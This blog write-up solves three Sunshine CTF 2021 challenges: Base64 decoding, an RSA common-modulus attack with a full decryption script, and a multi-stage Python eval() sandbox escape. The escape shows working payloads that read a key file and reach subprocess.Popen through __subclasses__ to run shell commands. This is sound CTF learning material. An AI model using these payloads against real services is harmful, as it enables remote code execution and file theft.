---
layout: default
title: Sunshine 2021
nav_order: 5
description: "Sunshine 2021 CTF"
permalink: /ctfs/sunshine21
has_children: false
parent: CTF list
---

# Sunshine CTF 2021
{: .no_toc}

This is the sixth year of Sunshine CTF organized by [Knightsec a.k.a Hack@UCF][1]. I had 
moved on to Sunshine CTF after trying out the [Peanut Butter JAR CTF][2] held on the same 
day. This also meant I was able to attempt only a few select challenges for which the 
solutions are discussed below.  
{: .fs-5 .fw-300 }

It had two check flags to acquaint us with the flag format. One was available in the discord
channel **#announcements** as **`sun{dont_u_love_work_from_home}`** and another was part of
the liveness test challenge instructions as **`sun{flag_to_check_if_you_are_alive}`**. These
establish that all flags are of the format **`sun{...}`**.
{: .fs-5 .fw-300 }

## Challenge list
{: .no_toc .text-delta}

1. TOC
{:toc}


## Mr Robot 🤖
Miscellaneous
{: .label .label-green .fs-1 .ml-0}

This was a very simple challenge to start with which mainly required only our exposure to
different types of encoding schemes. The challenge instructions is the only thing we had to
work with.  

Challenge instructions:
> What I'm about to tell you **`c3Vue2`** is top secret. A conspiracy **`hlbG`** bigger than 
> all of us. There's a powerful group of people out there that are secretly running the world.  
> I'm talking about the **`xvX3dv`** guys no one knows about, the ones that are invisible.  
> The top 1% of the top 1%, the **`cmxk`** guys that play God without permission.  
> And now I think they're **`fQ==`** following me.

The only difference in the above and the one seen in the actual challenge description is that I
have highlighted the relevant parts above.  

On initially reading through the instructions, the last part which includes **`fQ==`** gave me a 
clear impression that it is the last part of a [**Base 64**][3] encoding. This is because the 
character **`=`** in this encoding scheme is a padding token.  

With the above background on re-reading the instructions all the highlighted pieces was clear to 
be part of the encoded text. Gathering all the parts and assembling in the order they appear in the
instructions we get the encoded text as **`c3Vue2hlbGxvX3dvcmxkfQ==`**. Base64 decoding using any
of the online tools we get the flag as **`sun{hello_world}`**.  

## Multiple exponents 🔮
Crypto
{: .label .label-green .fs-1 .ml-0}

This was a good Cryto challenge which brought out the vulnerability of having common modulus for
multiple users and using individual exponents for encrypting the same message. The same would be
clear to you once you finish reading this write up.  

We are provided with the below challenge instructions and a script file which gives us the details
of the encryption and the cipher text obtained by both Alice and Bob. The file is included as
a code block below.

Challenge instructions:
> Both Alice and Bob share the same modulus, but with different exponents. If only there was some  
> way I could recover this message that was sent to both of them.  

<details markdown="block">
  <summary>
  Click here to view <b>source.py</b>
  </summary>  

```python
from Crypto.Util.number import getPrime
from sunshine_secrets import FLAG

p = getPrime(512)
q = getPrime(512)
assert p != q
n = p * q
phi = (p-1) * (q-1)

e1 = getPrime(512)
e2 = getPrime(512)

d1 = pow(e1, -1, phi)
d2 = pow(e2, -1, phi)

f = int(FLAG.encode("utf-8").hex(), 16)

c1 = pow(f, e1, n)
c2 = pow(f, e2, n)

print({"n": n, "e1": e1, "e2": e2, "c1": c1, "c2":c2})

"""
Here is the output.
{
    "n": 86683300105327745365439507825347702001838360528840593828044782382505346188827666308497121206572195142485091411381691608302239467720308057846966586611038898446400292056901615985225826651071775239736355509302701234225559345175968513640372874437860580877571155199027883755959442408968543666251138423852242301639,
    "e1": 11048796690938982746152432997911442334648615616780223415034610235310401058533076125720945559697433984697892923155680783661955179131565701195219010273246901,
    "e2": 9324711814017970310132549903114153787960184299541815910528651555672096706340659762220635996774790303001176856753572297256560097670723015243180488972016453,
    "c1": 84855521319828020020448068809384113135703375013574055636013459151984904926013060168559438932572351720988574536405041219757650609586761217385808427001020204262032305874206933548737826840501447182203920238204769775531537454607204301478815830436609423437869412027820433923450056939361510843151320837485348066171,
    "c2": 54197787252581595971205193568331257218605603041941882795362450109513512664722304194032130716452909927265994263753090021761991044436678485565631063700887091405932490789561882081600940995910094939803525325448032287989826156888870845730794445212288211194966299181587885508098448750830074946100105532032186340554
}
"""
```  
</details>

From the above it is clear that we are provided with the modulus **`n`**, exponents of Alice and  
Bob **`e1`** & **`e2`**, cipher texts of Alice and Bob **`c1`** & **`c2`**.  

As the exponents are large I did not have much confidence in using the [**RsaCtfTool**][4] and 
rightly so, the tool was not able to exploit with the available details. Also, as we have details
of two members, I did slowly realize that this had something to do with the Math behing the modulo
cryptography.  

So I started reading articles on such exploits and came across various exploit articles handling similar
challenges. One such article is [here][5] which explained the Mathematical vulnerability clearly. Another
excellent article that I came across is [here][8].  

Now that the Math behind it is clear, we go ahead to apply the same to our inputs. It is clear that we
need to find one value for each exponent such that the sum of the pairwise product of the exponent and 
the value is equal to the GCD of both the exponents.  

The GCD of the exponents can be verified using [**sympy.gcd**][6]. The below script finds the values
for each of **`e1`** and **`e2`**, followed by computing the flag.  
<details markdown="block">
  <summary>
  Click here for <b>decode.py</b>
  </summary>  

```python
import gmpy2
from Crypto.Util.number import long_to_bytes


def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)


e1 = 11048796690938982746152432997911442334648615616780223415034610235310401058533076125720945559697433984697892923155680783661955179131565701195219010273246901
e2 = 9324711814017970310132549903114153787960184299541815910528651555672096706340659762220635996774790303001176856753572297256560097670723015243180488972016453
gcd, a, b = egcd(e1, e2)
print("GCD =", gcd)
print("a =", a)
print("b =", b)

n = 86683300105327745365439507825347702001838360528840593828044782382505346188827666308497121206572195142485091411381691608302239467720308057846966586611038898446400292056901615985225826651071775239736355509302701234225559345175968513640372874437860580877571155199027883755959442408968543666251138423852242301639
c1 = 84855521319828020020448068809384113135703375013574055636013459151984904926013060168559438932572351720988574536405041219757650609586761217385808427001020204262032305874206933548737826840501447182203920238204769775531537454607204301478815830436609423437869412027820433923450056939361510843151320837485348066171
c2 = 54197787252581595971205193568331257218605603041941882795362450109513512664722304194032130716452909927265994263753090021761991044436678485565631063700887091405932490789561882081600940995910094939803525325448032287989826156888870845730794445212288211194966299181587885508098448750830074946100105532032186340554

c2_inv = pow(c2, b, n)
c1 = pow(c1, a, n)

cp = c1 * c2_inv % n
print("message_long =", cp)
print("message =", long_to_bytes(cp))
```
</details>  

As seen below the execution of the above script directly gives us the required flag **`sun{d0n7_d0_m0r3_th4n_0ne_3xp0n3nt}`**.  

![More than one exponent execution][7]

## Procrastinator Programmer 🥱
Scripting
{: .label .label-green .fs-1 .ml-0}

It was a really well structured challenge that brought out the vulnerabilities
in Python [**`eval`**][9] and [**`exec`**][10] statements. It is necessary that you first
go through the Python documentation linked for each of them.  

The main difference is that **`eval`** only allows expressions to be evaluated where as
**`exec`** allows execution of multi line code. With this background and the challenge
instructions below we connect to the given web url and port using netcat.  


Challenge instructions:
> I may have procrastinated. This may be a mistake. Or mistakes were made.  
> I may have procrastinated security for procrastinate.chal.2021.sunshinectf.org:65000.  
> 
> I may have been watching too many Tom Cruise movies instead of releasing this... uh... 
> last year. But don't worry! The keys to the kingdom are split into three parts... 
> you'll never find them all!  
> 
> Flag will be given by our backend in the standard sun{} format, but make sure you put 
> all the pieces together!  
> 
> Notes  
> Need help on your math? If so? ProcrastinatorProgrammer is your buddy! Send equations 
> our way, and we'll solve them your way!  
> 
> Example Usages  
> Send an equation, like  
> cos(5) + sin(7)  
> and we'll send an answer! In this case, 0.9406487841820153.  
> 
> Need more complicated equations? No problem! Our python3 backend can handle anything 
> you throw at it.
> fsum([.1, .1, .1, .1, .1, .1, .1, .1, .1, .1]) + gcd(19,29,39,49,59,69)
> =>2.0  
> 
> Note: In the future we may disable components if we find there's security issues with them.

To initially test whether **`eval`** or **`exec`** is used we supply a payload with line separator
characters in them. As this fails and also prints the exact **`eval`** conditions used, we see that
the **`eval`** statement does not restrict usage of any functions from the Python [**`builtins`**][11].  

Also the details given by the server is shown below:
```sh
┌──(cryptonic㉿cryptonic-kali)-[~/CTFs/sunshinectf/procrastinate]
└─$ nc procrastinate.chal.2021.sunshinectf.org 65000
Welcome to the ProcrastinatorProgrammer backend.  
Please give me an equation! Any equation! I need to be fed some data to do some processing!  
I'm super secure, and can use all python! I just use `eval()` on your data and then whamo,  
python does all the work!Whatever you do, don't look at my ./key!  

Give me an equation please!
```

The above clearly indicates that we need to somehow exploit the vulnerability in the usage of
**`eval`** command to read the **`./key`** file. Given that **`builtins`** module is not restricted
it is really easy to do. We can use the below payload to read the file and spill the details as the
file open method is part of the **`builtins`** module.  
```python
open("./key","r").read()
```

On sending this payload to this level, we get the below response:
```sh
sun{eval_is

If you completed part 1 of the challenge...

Your princess is in another castle! 🔥🏰🔥

procrastinate-castle.chal.2021.sunshinectf.org 65001 holds your next clue.
```  

So clearly the first part of the flag is **`sun{eval_is`** and we need to move on to the next level,
in the new url. On connecting to this server we are greeted with the below message that asks us
to enter the previous levels partial flag. Once done we can enter our expression to be evaluated.  

```sh
┌──(cryptonic㉿cryptonic-kali)-[~/CTFs/sunshinectf/procrastinate]
└─$ nc procrastinate.chal.2021.sunshinectf.org 65001
Welcome to the ProcrastinatorProgrammer backend.
Please give me an equation! Any equation! I need to be fed some data to do some processing!Due 
to technical difficulties with the last challenge, I've upped my ante! Now I know it's secure!  

I'm super secure, and can use most python math! I just use `eval(client_input, \{\}, safe_math_functions)`  
on your data and then whamo, python does all the work!Whatever you do, don't look at my ./key!

Halt in the name of the law!

What was the ./key found in the previous challenge?

sun{eval_is
Give me an equation please!
```  

The greeting message shows us clearly that an empty dict is used for the second parameter of the
**`eval`** method. This is no different than sending **`None`** for the parameter which means we
can use an almost similar payload.  

This time I used the payload below and got the subsequent response.
```python
print(open("./key", "r").read())
```

```sh
_safe_


If you completed part 2 of the challenge...

You need sequels. MORE SEQUELS!! 🔥🏰🔥

procrastinate-sequel.chal.2021.sunshinectf.org 65002 holds your next clue.
```

This again was very clearly some middle part of the flag and so I proceeded to the final level.
On connecting to this level we are greeted with the below message:

```sh
┌──(cryptonic㉿cryptonic-kali)-[~/CTFs/sunshinectf/procrastinate]
└─$ nc procrastinate.chal.2021.sunshinectf.org 65002
Welcome to the ProcrastinatorProgrammer backend.
Please give me an equation! Any equation! I need to be fed some data to do some processing!  
Due to technical difficulties with the previous set, I had to remove math lib support!  

In fact the only thing this can do is add and subtract now!... I think. Google tells me that  
it's secure now! Well the second result anyhow.  

I'm super secure, and can use a bit of python math! I just use `eval(client_input, {'__builtins__':\{\}})`  
on your data and then whamo, python does all the work!Whatever you do, don't look at my ./key!

Halt in the name of the law!

What was the ./key found in the previous challenge?

_safe_
Give me an equation please!
```  

This level was a bit challenging and required a more complicated payload as the **`builtins`**
module was restricted. This meant any of the default Python functions were not available. However,
there would necessarily be some imports used in this level's code.  

There can surely be vulnerable modules which can be exploited via eval. Also to find the classes and
modules in the import we can use the payload **`().__class__.__base__.__subclasses()`**. This lists
all the classes loaded as part of this code. We find that the **`subprocess.Popen`** class is available
which can be used to run any OS commands on the shell.  

```sh
┌──(cryptonic㉿cryptonic-kali)-[~/CTFs/sunshinectf/procrastinate]
└─$ nc procrastinate.chal.2021.sunshinectf.org 65002
Welcome to the ProcrastinatorProgrammer backend.  
Please give me an equation! Any equation! I need to be fed some data to do some processing!  

Due to technical difficulties with the previous set, I had to remove math lib support! 
In fact the only thing this can do is add and subtract now!... I think. Google tells me that  
it's secure now! Well the second result anyhow.I'm super secure, and can use a bit of python math!  

I just use `eval(client_input, {'__builtins__':\{\}})` on your data and then whamo, python  
does all the work!Whatever you do, don't look at my ./key!

Halt in the name of the law!

What was the ./key found in the previous challenge?

_safe_
Give me an equation please!

().__class__.__base__.__subclasses__()                     
[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, 
<class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, 
<class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, ....
....
....
<class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'contextlib.ContextDecorator'>,
 <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, 
 <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>, <class 'multiprocessing.util.Finalize'>, 
 <class 'multiprocessing.util.ForkAwareThreadLock'>, <class 'multiprocessing.popen_fork.Popen'>]
```

As said before the availability of the **`subrocess.Popen`** class is more than enough for us to run 
OS commands like **`cat ./key`** to read and print the contents back to us.  

As we have this knowledge we carefully craft the below payload to do exactly the same as mentioned 
above and get the subsequent response.  
```sh
().__class__.__base__.__subclasses__()[-4](["cat","./key"])
<Popen: returncode: None args: ['cat', './key']>
only_if_you_ast_whitelist_first}
If you completed part 3 of the challenge...

 just sum the three clues together to get the flag. It's a three-part equation, very complicated.
```

I would like to explain the various parts of the payload above. Let us take it part by part:
```text
() - current instance
__class__ - called on current instance returns its class object
__base__ - returns the base object of the class stored as an attribute in __class__
__subclasses__() - invokes the subclasses method which returns an array of classes loaded
```

From the output of **`__subclasses__()`** we find that **`subprocess.Popen`** class is returned as the
fourth object from the last in the array. So we use the index **`-4`**. Also it is not necessary to
only use this object. There might be other objects which also allow us to read the required data which can
also be used by changing the appropriate indices and subsequent methods used from the chosen class.  

As we chose the **`subprocess.Popen`** class we invoke the **`__init__`** implicitly by instantiating
it with the **`()`** along with the required args that form the array of command followed by their
arguments.  

The effective execution is of the **`cat ./key`** in the shell of the server that is running this level.

Thus we have the third part of our flag which is **`only_if_you_ast_whitelist_first}`**. Putting the
three together our final full flag is **`sun{eval_is_safe_only_if_you_ast_whitelist_first}`**.  

A capture of the whole exploit in action can be seen below.

![Eval vulnerability exploit solve][12]

[1]: https://ctftime.org/team/2500
[2]: https://ctftime.org/event/1430
[3]: https://en.wikipedia.org/wiki/Base64
[4]: https://github.com/Ganapati/RsaCtfTool
[5]: https://amritabi0s.wordpress.com/2017/12/17/inctf-2017-rsa-1s-fun-writeup/comment-page-1/
[6]: https://docs.sympy.org/latest/modules/core.html?highlight=gcd#sympy.core.numbers.Number.gcd
[7]: https://gcdn.pbrd.co/images/UpCUChV0D0sj.gif?o=1
[8]: https://pequalsnp-team.github.io/writeups/common_modulus
[9]: https://docs.python.org/3.8/library/functions.html#eval
[10]: https://docs.python.org/3.8/library/functions.html#exec
[11]: https://docs.python.org/3.8/library/builtins.html
[12]: https://gcdn.pbrd.co/images/p2LbJZx0aIoU.gif?o=1